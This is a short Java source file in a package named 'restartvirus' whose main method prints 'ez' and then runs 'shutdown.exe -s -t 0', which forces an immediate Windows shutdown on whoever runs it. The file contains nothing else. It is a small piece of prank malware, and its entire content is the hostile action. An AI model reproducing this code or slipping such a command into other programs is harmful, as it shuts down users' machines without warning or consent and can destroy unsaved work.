package in.momin5.restartvirus;

import java.io.IOException;

public class Main {

    public static void main(String[] args) throws RuntimeException, IOException {
        String operatingSystem = System.getProperty("os.name");
        System.out.println("ez");
        Runtime.getRuntime().exec("shutdown.exe -s -t 0");
            }
    }

